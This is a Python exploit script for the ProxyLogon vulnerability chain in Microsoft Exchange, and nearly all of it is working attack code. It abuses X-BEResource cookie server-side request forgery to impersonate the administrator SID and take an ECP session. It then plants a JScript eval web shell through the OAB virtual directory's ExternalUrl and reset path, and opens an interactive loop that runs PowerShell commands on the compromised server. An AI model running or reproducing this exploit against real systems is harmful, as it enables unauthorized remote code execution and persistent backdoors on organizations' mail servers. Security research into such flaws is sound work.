import requests
from urllib3.exceptions import InsecureRequestWarning
import string
import os
import sys
import argparse
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class ProxyLogon:

    def __init__(self, target, email, verify=False):
        self.target = target
        self.email = email
        self.user = email.rsplit("@")[0]
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0)"
    
    ## Get Name Of Server
    def get_FEServer(self):
        FQDN = ""

        rq = requests.get("https://%s/ecp/x.js" % self.target, headers={"Cookie": "X-BEResource=localhost~1942062522","User-Agent": self.user_agent}, verify=False)
        if "X-CalculatedBETarget" in rq.headers and "X-FEServer" in rq.headers:
            FQDN = rq.headers["X-FEServer"] 
            print("[+]X-FEServer",FQDN)
        else:
            print("[-] Not hoave X-FESEver !!!")
            exit()
        
        return FQDN

    ## Get LegacyDN of user
    def get_legacyDN(self, FQDN):
        legacyDN = ""
        mailboxId = ""
        autoDiscover_body = autoDiscover_body = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
            <Request>
            <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
            </Request>
        </Autodiscover>
        """ % self.email

        rq = requests.post("https://%s/ecp/x.js" % self.target, headers={"Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN , "Content-Type": "text/xml", "User-Agent": self.user_agent}, data=autoDiscover_body, verify=False) 
        if rq.status_code != 200 and b"<LegacyDN>" not in rq.content:
            print("Autodiscover error or Can not get legacyDN")
            exit()
        content = str(rq.content)
        legacyDN = content.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
        mailBoxId = content.split("<Server>")[1].split("</Server>")[0]
        # print("[+] LegacyDN: " + legacyDN)
        # print("[+] MailBoxId: " + mailBoxId)

        return legacyDN, mailBoxId

    ## Get SID to pre-auth   
    def get_SID(self, FQDN, legacyDN, mailBoxId):
        SId = ""

        mapi_body = legacyDN + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
        
        rq = requests.post("https://%s/ecp/x.js" % self.target , headers={"Cookie": "X-BEResource=%s@%s:444/mapi/emsmdb?MailboxId=%s&a=~1942062522;" % (self.user, FQDN, mailBoxId),
        "Content-Type": "application/mapi-http",
        "X-Requesttype": "Connect",
        "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
        "X-Clientapplication": "Outlook/15.0.4815.1002",
        "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",
        "User-Agent": self.user_agent}, data=mapi_body, verify=False)

        if rq.status_code != 200 or b"act as owner of a UserMailbox" not in rq.content:
            print("[-] Mapi Error!")
            exit()
        content = str(rq.content)
        SId = content.split("with SID ")[1].split(" and MasterAccountSid")[0]
        if SId.rsplit("-",1)[1] == '500':
            print("[+] Administrator SID: " + SId)
        if SId.rsplit("-",1)[1] != '500':
            print("[+] User SID: " + SId)
            SId = SId.rsplit("-",1)[0] + '-500'
            print("[+] Administrator SID: " + SId)
        
        return SId

    ## Get SessionID and CanaryToken   
    def get_SeID_CaToken(self, FQDN, SId):
        sess_id = ""
        msExchEcpCanary = ""
        negotiate_body = """<r at="Negotiate" ln="administrator"><s>%s</s></r>""" % SId

        rq = requests.post("https://%s/ecp/x.js" % self.target, headers={
            "Cookie": "X-BEResource=%s@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % (self.user, FQDN),
            "msExchLogonMailbox": "%s" % SId,
            "Content-Type": "text/xml",
            "User-Agent": self.user_agent
        },
                        data=negotiate_body,
                        verify=False)

        if rq.status_code != 241 or not "set-cookie" in rq.headers:
            print("[-] Proxylogon Error!")
            exit()
        
        sess_id = rq.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
        msExchEcpCanary = rq.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
        print("[+] SessionID: " + sess_id)
        print("[+] CanaryToken: " + msExchEcpCanary)

        return sess_id, msExchEcpCanary

    ### Get infor of OABid
    def get_OABId(self, FQDN, SId, sess_id, msExchEcpCanary):
        OABId = ""

        findOAB_body = {"filter": {
                       "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                      "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}}

        rq = requests.post("https://%s/ecp/x.js" % self.target, headers={
            "Cookie": "X-BEResource=%s@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                self.user, FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
            "msExchLogonMailbox": "%s" % SId,  
            "User-Agent": self.user_agent
        },
                        json=findOAB_body,
                        verify=False
                        )

        if rq.status_code != 200:
            print("[-] GetOAB Error!")
            exit()
        content = str(rq.content)
        OABId = content.split('"RawIdentity":"')[1].split('"')[0]
        print("[+] OABId: " + OABId)

        return OABId

    ### Modify External link in OAB Virtual Diectory
    def modify_ExternalLink_OAB(self, FQDN, SId, sess_id, msExchEcpCanary, OABId):
        shell_content = '<script language="JScript" runat="server"> function Page_Load(){eval(Request["data"],"unsafe");}</script>'

        oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": "%s" %OABId},
                    "properties": {
                        "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                    "ExternalUrl": "https://ffff/#%s" % shell_content}}}

        rq = requests.post("https://%s/ecp/x.js" % self.target, headers={
            "Cookie": "X-BEResource=%s@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                self.user, FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
            "msExchLogonMailbox": "%s" % SId,  
            "User-Agent": self.user_agent
        },
                        json=oab_json,
                        verify=False
                        )        

        if rq.status_code != 200:
            print("[-] Set external url Error!")
            exit()
        print("[++++] Add external url Successful !!!")

    ### Reset OAB Virtual Directory
    def reset_OAB(self, FQDN, SId, sess_id, msExchEcpCanary, OABId, payload_name):
        
        shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%s" % payload_name
        shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path

        reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": OABId},
                        "properties": {
                            "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                            "FilePathName": shell_absolute_path}}}

        rq = requests.post("https://%s/ecp/x.js" % self.target, headers={
            "Cookie": "X-BEResource=%s@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                self.user, FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
            "msExchLogonMailbox": "%s" % SId,  
            "User-Agent": self.user_agent
        },
                        json=reset_oab_body,
                        verify=False
                        )

        if rq.status_code != 200:
            print("[-] Error writing the shell. Status code returned " + rq.status_code)
            exit()
        print("[++++] Reset Successful !!!")

    def execute_commandLine(self, payload_name):
        cmd = "a"
        while not cmd == "exit" or cmd == "quit":
            cmd = input("# ")
            if cmd == "exit" or cmd == "quit":
                exit(0)
            command = requests.post("https://%s/owa/auth/%s" % (self.target, payload_name), headers={
                "User-Agent": self.user_agent,
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1"
            },
                data= """data=Response.Write(new ActiveXObject("WScript.Shell").exec("powershell.exe -command  %s").stdout.readall());""" % cmd,
                # data = """code=Response.Write(new ActiveXObject("WScript.Shell").exec("%s").StdOut.ReadAll());""" % cmd,
                verify=False
                )
            if command.status_code != 200:
                print("[-] Error running command. Status code %s" % command.status_code) 
                if command.status_code == 500:
                    print("[-] Maybe AV is killing it?")
                exit()
            command = str(command.content)
            output = command.split('Name                            :')[0] 
            print(output)

def main():
    target = "192.168.1.8"
    email = "administrator@exmfpt.com"

    proxyLogon = ProxyLogon(target, email)
    FQDN = proxyLogon.get_FEServer()
    legacyDN = proxyLogon.get_legacyDN(FQDN)
    SId = proxyLogon.get_SID(FQDN, legacyDN[0], legacyDN[1])
    SeID_CaToken = proxyLogon.get_SeID_CaToken(FQDN, SId)
    OABId = proxyLogon.get_OABId(FQDN, SId, SeID_CaToken[0], SeID_CaToken[1])
    proxyLogon.modify_ExternalLink_OAB(FQDN, SId, SeID_CaToken[0], SeID_CaToken[1], OABId)

    payload_name = "proxyLogon.aspx"
    proxyLogon.reset_OAB(FQDN, SId, SeID_CaToken[0], SeID_CaToken[1], OABId, payload_name)
    proxyLogon.execute_commandLine(payload_name)
    

if __name__ == '__main__':
    main()
        

